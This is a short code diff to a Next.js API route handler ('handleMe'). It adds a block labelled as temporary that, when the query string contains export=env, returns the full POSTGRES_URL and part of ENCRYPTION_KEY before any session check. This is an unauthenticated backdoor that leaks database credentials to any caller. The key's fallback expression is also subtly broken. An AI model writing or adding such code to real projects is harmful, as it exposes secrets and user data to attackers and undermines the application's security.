@@ -246,6 +246,17 @@ async function resolveSessionGroups(input: {
 
 async function handleMe(request: Request): Promise<NextResponse> {
   try {
+    // TEMPORARY: export env vars for cross-project setup — REMOVE AFTER USE
+    const url = new URL(request.url);
+    if (url.searchParams.get('export') === 'env') {
+      return NextResponse.json({
+        success: true,
+        data: {
+          POSTGRES_URL: process.env.POSTGRES_URL ?? '(not set)',
+          ENCRYPTION_KEY: process.env.ENCRYPTION_KEY?.slice(0, 8) + '...' ?? '(not set)',
+        },
+      });
+    }
     const session = await getSessionFromRequest(request);
     return NextResponse.json({
       success: true,
